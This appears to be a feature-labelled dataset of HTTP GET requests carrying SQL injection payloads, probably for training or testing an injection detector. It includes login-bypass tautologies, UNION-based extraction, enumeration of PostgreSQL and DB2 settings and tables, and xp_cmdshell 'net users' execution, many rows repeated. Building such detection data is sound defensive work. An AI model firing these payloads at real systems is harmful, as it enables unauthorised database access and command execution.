91,1,200,4548,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,6239,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
36,1,200,6110,7,11,6,2,1,GET login/?id=") or ("a"="a HTTP/1.1
69,1,200,7459,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,4305,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,2030,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,2126,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,5501,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,2921,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
56,1,200,7514,7,33,8,1,1,GET ?id=select current_setting('virtual_host'); HTTP/1.1
40,1,200,5370,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,4610,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,3942,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,6048,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,1315,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,2058,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
40,1,200,2899,7,19,5,1,1,GET ?id=select * from pg_group; HTTP/1.1
55,1,200,5998,7,28,7,2,1,GET login/?id=' group by username having 1=1-- HTTP/1.1
63,1,200,1546,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,5868,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,2664,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
30,1,200,4668,7,6,6,1,1,GET ?id=") or ("a"="a HTTP/1.1
30,1,200,5933,7,6,6,1,1,GET ?id=") or ("a"="a HTTP/1.1
63,1,200,5600,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,1238,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,1789,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,5489,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,2998,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,1952,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,6803,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
35,1,200,4307,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
35,1,200,6262,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
35,1,200,5442,7,13,7,2,1,GET login/?id=') or true-- HTTP/1.1
28,1,200,1029,7,4,6,1,1,GET ?id=" or 1=1 -- HTTP/1.1
28,1,200,5064,7,4,6,1,1,GET ?id=" or 1=1 -- HTTP/1.1
28,1,200,5932,7,4,6,1,1,GET ?id=" or 1=1 -- HTTP/1.1
28,1,200,6024,7,4,6,1,1,GET ?id=" or 1=1 -- HTTP/1.1
18,1,200,2077,7,2,4,1,0,GET ?id== HTTP/1.1
37,1,200,3084,7,9,11,2,1,GET login/?id=' or '1'='1'-- HTTP/1.1
37,1,200,5065,7,9,11,2,1,GET login/?id=' or '1'='1'-- HTTP/1.1
37,1,200,6338,7,9,11,2,1,GET login/?id=' or '1'='1'-- HTTP/1.1
33,1,200,5987,7,4,7,2,1,GET ?id=") or ("1"="1"/* HTTP/1.1
38,1,200,4850,7,9,7,2,1,GET ?id=admin") or ("1"="1"/* HTTP/1.1
38,1,200,6203,7,9,7,2,1,GET ?id=admin") or ("1"="1"/* HTTP/1.1
35,1,200,1264,12,4,7,1,1,GET ?id=' or 1=1 LIMIT 1;# HTTP/1.1
35,1,200,6345,12,4,7,1,1,GET ?id=' or 1=1 LIMIT 1;# HTTP/1.1
20,1,200,3643,7,2,4,1,1,GET ?id="^" HTTP/1.1
20,1,200,2309,7,2,4,1,1,GET ?id="^" HTTP/1.1
42,1,200,5820,7,14,5,3,1,GET login/?id=admin" or "1"="1"/* HTTP/1.1
26,2,200,3803,7,7,4,2,2,GET login/?id="&" HTTP/1.1
43,1,200,4339,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,1470,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,6740,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,5132,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,4095,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,7311,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,1632,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
35,1,200,1250,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
35,1,200,7989,7,9,9,2,1,GET login/?id=%' or '0'='0 HTTP/1.1
26,1,200,4258,7,5,4,1,0,GET ?id= and 1=1¡V HTTP/1.1
26,1,200,5387,7,5,4,1,0,GET ?id= and 1=1¡V HTTP/1.1
33,1,200,5298,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
26,1,200,4025,7,7,5,2,1,GET login/?id=' # HTTP/1.1
36,1,200,6271,7,9,6,2,1,GET login/?id=") or ("1"="1 HTTP/1.1
36,1,200,6062,7,9,6,2,1,GET login/?id=") or ("1"="1 HTTP/1.1
29,1,200,2805,7,4,9,1,1,GET ?id=%' or '0'='0 HTTP/1.1
57,1,200,5889,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,5684,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,2261,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,3892,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,7343,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,5317,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,2159,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
45,1,200,1194,7,14,8,2,1,GET login/?id=' or 1=1 limit 1 -- -  HTTP/1.1
45,1,200,7341,7,14,8,2,1,GET login/?id=' or 1=1 limit 1 -- -  HTTP/1.1
31,1,200,7700,7,9,4,2,1,GET login/?id=" or 1=1 HTTP/1.1
50,1,200,1198,7,15,13,1,1,GET ?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,3400,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
56,1,200,6003,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
56,1,200,5695,21,14,8,2,1,GET login/?id=' UNION ALL SELECT 1_ @@version;# HTTP/1.1
28,1,200,4676,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
28,1,200,2088,7,6,8,1,1,GET ?id=' or 'x'='x HTTP/1.1
36,1,200,2437,7,11,10,2,1,GET login/?id=') or ('x'='x HTTP/1.1
34,1,200,5371,7,11,4,2,1,GET login/?id=" or "x"="x HTTP/1.1
34,1,200,7453,7,11,4,2,1,GET login/?id=" or "x"="x HTTP/1.1
34,1,200,5655,7,11,4,2,1,GET login/?id=" or "x"="x HTTP/1.1
24,1,200,1634,7,7,4,2,1,GET login/?id=' HTTP/1.1
24,1,200,4911,7,7,4,2,1,GET login/?id=' HTTP/1.1
26,1,200,1960,7,4,4,1,1,GET ?id=" or ""-" HTTP/1.1
32,1,200,3805,7,9,8,2,1,GET login/?id=' or ''=' HTTP/1.1
30,1,200,4572,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
30,1,200,4562,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
30,1,200,7550,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
30,1,200,6680,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
20,1,200,5585,7,2,4,1,1,GET ?id="-" HTTP/1.1
20,1,200,5219,7,2,4,1,1,GET ?id="-" HTTP/1.1
37,1,200,6835,7,9,12,1,1,GET ?id=admin') or '1'='1'-- HTTP/1.1
32,1,200,3829,7,11,5,2,1,GET login/?id=' or a=a¡V HTTP/1.1
31,1,200,7614,7,4,10,2,1,GET ?id=' or '1'='1'/* HTTP/1.1
20,1,200,3557,7,2,6,1,1,GET ?id='^' HTTP/1.1
30,1,200,1550,7,4,5,1,1,GET ?id=" or "1"="1"# HTTP/1.1
30,1,200,3327,7,4,5,1,1,GET ?id=" or "1"="1"# HTTP/1.1
24,1,200,2797,7,7,4,2,0,GET login/?id== HTTP/1.1
24,1,200,1513,7,7,4,2,0,GET login/?id== HTTP/1.1
24,1,200,6733,7,7,4,2,0,GET login/?id== HTTP/1.1
39,1,200,2864,7,16,6,2,1,GET login/?id=' or uid like '% HTTP/1.1
75,1,200,2599,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,6346,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,1878,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
63,1,200,2039,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,6751,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,5228,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,4082,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,3653,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
34,1,200,7299,7,11,8,2,1,GET login/?id=' or 'a'='a HTTP/1.1
59,1,200,5352,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,3003,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,3621,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
56,1,200,3898,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,5232,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
38,1,200,5324,7,11,9,2,1,GET login/?id='or 1=1 or ''=' HTTP/1.1
61,1,200,4346,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,7548,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,6049,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
33,1,200,6784,7,9,4,2,1,GET login/?id=" or 0=0 ¡V HTTP/1.1
44,1,200,5881,7,14,12,3,1,GET login/?id=admin') or ('1'='1'/* HTTP/1.1
44,1,200,4804,7,14,12,3,1,GET login/?id=admin') or ('1'='1'/* HTTP/1.1
44,1,200,3138,7,14,12,3,1,GET login/?id=admin') or ('1'='1'/* HTTP/1.1
34,1,200,3893,7,9,9,1,1,GET ?id=admin') or '1'='1 HTTP/1.1
20,1,200,3070,7,2,5,1,1,GET ?id=' ' HTTP/1.1
20,1,200,4883,7,2,5,1,1,GET ?id=' ' HTTP/1.1
36,1,200,2432,7,14,4,2,1,GET login/?id=admin" or 1=1 HTTP/1.1
58,1,200,5996,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,4748,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,3501,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
64,1,200,2246,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,4545,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,1209,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
31,1,200,2781,7,9,6,2,2,GET login/?id=or 1=1-- HTTP/1.1
27,1,200,4615,7,4,6,1,1,GET ?id=' or 0=0 # HTTP/1.1
26,1,200,6813,7,4,4,1,1,GET ?id=" or ""^" HTTP/1.1
43,1,200,4760,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
43,1,200,3156,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
43,1,200,2391,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
43,1,200,7966,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
43,1,200,7302,7,14,12,2,1,GET login/?id=admin') or '1'='1'-- HTTP/1.1
32,1,200,3815,7,9,5,2,1,GET login/?id=" or 1=1# HTTP/1.1
33,1,200,7514,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,6847,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,2033,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,5709,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,4517,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,1409,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,6787,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
37,1,200,3720,7,14,5,2,1,GET login/?id=admin" or 1=1# HTTP/1.1
37,1,200,6048,7,14,5,2,1,GET login/?id=admin" or 1=1# HTTP/1.1
37,1,200,5621,7,9,6,2,1,GET login/?id=") or "1"="1"# HTTP/1.1
37,1,200,6129,7,9,6,2,1,GET login/?id=") or "1"="1"# HTTP/1.1
41,1,200,1067,7,14,5,2,1,GET login/?id=admin" or "1"="1"# HTTP/1.1
53,1,200,5789,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,6063,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,5435,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,5441,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
53,1,200,7316,7,30,7,1,2,GET ?id=exec master..xp_cmdshell 'net users' HTTP/1.1
35,1,200,1963,7,9,9,2,1,GET login/?id=') or '1'='1 HTTP/1.1
35,1,200,4861,7,9,9,2,1,GET login/?id=') or '1'='1 HTTP/1.1
62,1,200,3007,7,38,8,1,1,GET ?id=select current_setting('krb_server_keyfile'); HTTP/1.1
27,1,200,5641,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
27,1,200,4458,7,4,5,1,1,GET ?id=" or 0=0 # HTTP/1.1
26,1,200,6214,7,7,5,3,1,GET login/?id='/* HTTP/1.1
26,1,200,6808,7,7,5,3,1,GET login/?id='/* HTTP/1.1
25,1,200,5830,7,7,5,1,1,GET ?id=admin' # HTTP/1.1
35,1,200,6001,7,13,6,2,1,GET login/?id=") or true-- HTTP/1.1
33,1,200,4099,7,9,5,2,1,GET login/?id=' or 0=0 ¡V HTTP/1.1
32,1,200,1148,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
35,1,200,3362,7,9,7,2,1,GET login/?id=) or '1¡¬='1¡V HTTP/1.1
28,1,200,6251,7,4,7,1,1,GET ?id=' or 1=1 -- HTTP/1.1
28,1,200,4192,7,4,7,1,1,GET ?id=' or 1=1 -- HTTP/1.1
27,1,200,4487,7,4,7,1,1,GET ?id=' or 1=1;# HTTP/1.1
33,1,200,3681,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
33,1,200,1382,7,11,7,2,1,GET login/?id=' or a=a-- HTTP/1.1
37,1,200,2476,7,9,6,2,1,GET ?id=admin") or "1"="1"/* HTTP/1.1
35,1,200,5908,7,9,6,1,1,GET ?id=admin") or ("1"="1 HTTP/1.1
35,1,200,7199,7,9,6,1,1,GET ?id=admin") or ("1"="1 HTTP/1.1
35,1,200,6677,7,9,6,1,1,GET ?id=admin") or ("1"="1 HTTP/1.1
31,1,200,2608,7,9,5,3,2,GET login/?id=or 1=1/* HTTP/1.1
31,1,200,3415,7,4,5,2,1,GET ?id=" or "1"="1"/* HTTP/1.1
20,1,200,2980,7,2,4,2,1,GET ?id="/* HTTP/1.1
33,1,200,5164,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
33,1,200,6818,7,4,8,1,1,GET ?id=") or ("1"="1"-- HTTP/1.1
41,1,200,2251,7,14,10,2,1,GET login/?id=admin') or ('1'='1 HTTP/1.1
32,1,200,5032,7,6,9,1,1,GET ?id='or 1=1 or ''=' HTTP/1.1
34,1,200,1284,7,9,4,2,1,GET login/?id=" or "1"="1 HTTP/1.1
34,1,200,3100,7,9,4,2,1,GET login/?id=" or "1"="1 HTTP/1.1
26,1,200,7714,7,4,4,1,0,GET ?id= or 0=0 ¡V HTTP/1.1
26,1,200,4448,7,4,4,1,0,GET ?id= or 0=0 ¡V HTTP/1.1
68,1,200,5765,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,2249,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,2579,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,5948,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
49,1,200,5572,7,23,7,1,1,GET ?id=' group by username having 1=1-- HTTP/1.1
49,1,200,1288,7,23,7,1,1,GET ?id=' group by username having 1=1-- HTTP/1.1
33,1,200,2257,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
33,1,200,7494,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
33,1,200,5126,7,9,6,3,1,GET login/?id=' or 1=1/* HTTP/1.1
28,1,200,6287,7,6,4,1,1,GET ?id=" or "x"="x HTTP/1.1
28,1,200,1194,7,6,8,1,1,GET ?id=' or 'a'='a HTTP/1.1
33,1,200,3395,7,9,6,2,2,GET login/?id= or 0=0 -- HTTP/1.1
37,1,200,7516,7,9,11,2,1,GET login/?id=') or '1'='1'# HTTP/1.1
38,1,200,3702,7,9,12,2,1,GET login/?id=') or ('1'='1'# HTTP/1.1
38,1,200,1959,7,9,12,2,1,GET login/?id=') or ('1'='1'# HTTP/1.1
81,1,200,7101,24,15,8,1,1,GET ?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
81,1,200,7916,24,15,8,1,1,GET ?id=' AND 1=0 UNION ALL SELECT ''_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
36,1,200,4305,7,9,11,1,1,GET ?id=admin' or '1'='1'-- HTTP/1.1
25,1,200,5317,7,4,5,1,0,GET ?id= or 1=1# HTTP/1.1
30,1,200,7556,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
43,1,200,4911,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
32,1,200,4098,7,9,8,2,1,GET login/?id=' or ''^' HTTP/1.1
42,1,200,3577,7,14,6,2,1,GET login/?id=admin") or "1"="1"# HTTP/1.1
42,1,200,7843,7,14,6,2,1,GET login/?id=admin") or "1"="1"# HTTP/1.1
42,1,200,7905,7,14,6,2,1,GET login/?id=admin") or "1"="1"# HTTP/1.1
55,1,200,7565,7,28,7,2,1,GET login/?id=' group by password having 1=1-- HTTP/1.1
26,1,200,1809,7,7,4,2,1,GET login/?id=' ¡V HTTP/1.1
41,1,200,2128,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,7501,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,5307,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,1930,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,5025,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
41,1,200,5028,7,20,6,2,0,GET login/?id=select version();	 HTTP/1.1
34,1,200,6768,7,9,6,2,1,GET login/?id=" or 1=1 -- HTTP/1.1
30,1,200,1093,7,4,8,1,1,GET ?id=) or ('1¡¬='1¡V HTTP/1.1
31,1,200,6486,7,4,11,1,1,GET ?id=') or '1'='1'# HTTP/1.1
42,1,200,5278,7,14,6,2,1,GET login/?id=admin" or "1"="1"-- HTTP/1.1
34,1,200,2365,7,9,5,1,1,GET ?id=admin") or "1"="1 HTTP/1.1
37,1,200,7564,7,11,9,1,1,GET ?id=admin'or 1=1 or ''=' HTTP/1.1
20,2,200,1640,7,2,6,1,1,GET ?id='&' HTTP/1.1
34,1,200,3494,7,9,6,2,1,GET login/?id=" or 0=0 -- HTTP/1.1
34,1,200,7555,7,9,6,2,1,GET login/?id=" or 0=0 -- HTTP/1.1
36,1,200,7526,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
36,1,200,6549,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
30,1,200,6210,7,9,4,1,1,GET ?id=admin" or 1=1 HTTP/1.1
30,1,200,5578,7,9,4,1,1,GET ?id=admin" or 1=1 HTTP/1.1
36,1,200,2432,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
26,1,200,2196,7,4,4,1,1,GET ?id=" or 1=1¡V HTTP/1.1
50,1,200,7546,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,6720,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,5653,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
39,1,200,3251,7,9,7,3,1,GET login/?id=") or ("1"="1"/* HTTP/1.1
57,1,200,2585,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
57,1,200,5691,7,36,5,2,1,GET login/?id=select grantee from syscat.dbauth; HTTP/1.1
41,1,200,7182,7,18,6,2,1,GET login/?id=' or uname like '% HTTP/1.1
27,1,200,2198,7,4,6,1,1,GET ?id=" or 1=1-- HTTP/1.1
27,1,200,3424,7,4,5,1,1,GET ?id=' or 1=1 ¡V HTTP/1.1
27,1,200,5714,7,4,5,1,1,GET ?id=' or 1=1 ¡V HTTP/1.1
57,1,200,6878,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,1671,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,2515,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
29,1,200,1447,7,8,7,1,1,GET ?id=') or true-- HTTP/1.1
29,1,200,1226,7,8,7,1,1,GET ?id=') or true-- HTTP/1.1
37,1,200,4214,7,14,6,2,1,GET login/?id=admin' or 1=1# HTTP/1.1
40,1,200,7299,7,17,6,2,1,GET login/?id=' or user like '% HTTP/1.1
25,1,200,1602,7,7,4,1,1,GET ?id=admin" # HTTP/1.1
36,1,200,3399,7,9,10,2,1,GET login/?id=' or '1'='1'# HTTP/1.1
32,1,200,2222,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1414,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5293,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
30,1,200,4320,7,4,10,1,1,GET ?id=') or ('1'='1 HTTP/1.1
27,1,200,3416,7,7,5,2,1,GET login/?id=" -- HTTP/1.1
26,1,200,4514,7,4,6,1,1,GET ?id=' or 1=1# HTTP/1.1
26,1,200,2098,7,4,6,1,1,GET ?id=' or 1=1# HTTP/1.1
28,1,200,1599,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
27,1,200,6217,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
27,1,200,2779,7,4,7,1,1,GET ?id=' or 1=1-- HTTP/1.1
20,1,200,4898,7,2,6,1,1,GET ?id='-' HTTP/1.1
36,1,200,6839,7,9,5,2,1,GET login/?id=" or "1"="1"# HTTP/1.1
38,1,200,7099,7,9,12,2,1,GET login/?id=') or '1'='1'-- HTTP/1.1
41,1,200,5041,12,9,7,2,1,GET login/?id=' or 1=1 LIMIT 1;# HTTP/1.1
31,1,200,6000,7,9,6,1,1,GET ?id=admin' or 1=1# HTTP/1.1
30,1,200,4916,7,9,5,2,0,GET login/?id=or 1=1# HTTP/1.1
30,1,200,7644,7,9,5,2,0,GET login/?id=or 1=1# HTTP/1.1
94,1,200,5452,17,55,7,2,1,GET login/?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
67,1,200,1114,7,36,10,3,1,GET login/?id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
33,1,200,4233,7,11,8,1,1,GET ?id=' and 'one'='one HTTP/1.1
32,1,200,2027,7,4,6,2,1,GET ?id=") or "1"="1"/* HTTP/1.1
27,1,200,6520,7,4,5,1,1,GET ?id=' or 0=0 ¡V HTTP/1.1
36,1,200,1022,7,6,12,1,1,GET ?id=")) or (("x"))=(("x HTTP/1.1
36,1,200,1594,7,6,12,1,1,GET ?id=")) or (("x"))=(("x HTTP/1.1
36,1,200,4797,7,9,6,1,1,GET ?id=admin") or "1"="1"# HTTP/1.1
26,2,200,2885,7,4,8,1,1,GET ?id=' or ''&' HTTP/1.1
37,1,200,1347,7,9,7,1,1,GET ?id=admin") or ("1"="1"# HTTP/1.1
37,1,200,4135,7,9,7,1,1,GET ?id=admin") or ("1"="1"# HTTP/1.1
32,1,200,7870,7,10,4,2,0,GET login/?id= and 1=1¡V HTTP/1.1
24,1,200,3350,7,4,6,1,1,GET ?id='or'1=1 HTTP/1.1
32,1,200,2162,7,6,8,1,1,GET ?id=") or ("x")=("x HTTP/1.1
32,1,200,5403,7,6,8,1,1,GET ?id=") or ("x")=("x HTTP/1.1
26,1,200,7727,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,1682,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,3187,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
32,1,200,1115,7,9,4,2,1,GET login/?id=" or ""*" HTTP/1.1
32,1,200,6708,7,4,12,1,1,GET ?id=') or '1'='1'-- HTTP/1.1
25,1,200,7142,7,4,6,1,1,GET ?id='or'1=1¡¬ HTTP/1.1
25,1,200,4875,7,4,6,1,1,GET ?id='or'1=1¡¬ HTTP/1.1
27,1,200,2917,7,4,5,2,1,GET ?id=" or 1=1/* HTTP/1.1
34,1,200,5525,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
37,1,200,7819,7,9,5,3,1,GET login/?id=" or "1"="1"/* HTTP/1.1
39,1,200,5153,7,15,8,2,1,GET login/?id=' or 'one'='one¡V HTTP/1.1
32,1,200,6788,7,9,5,3,2,GET login/?id= or 1=1/* HTTP/1.1
29,1,200,1961,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
31,1,200,6322,7,4,11,1,1,GET ?id=' or '1'='1'-- HTTP/1.1
21,1,200,4114,7,2,6,1,1,GET ?id=' -- HTTP/1.1
37,1,200,2338,7,9,6,2,1,GET login/?id=" or "1"="1"-- HTTP/1.1
37,1,200,1092,7,9,6,2,1,GET login/?id=" or "1"="1"-- HTTP/1.1
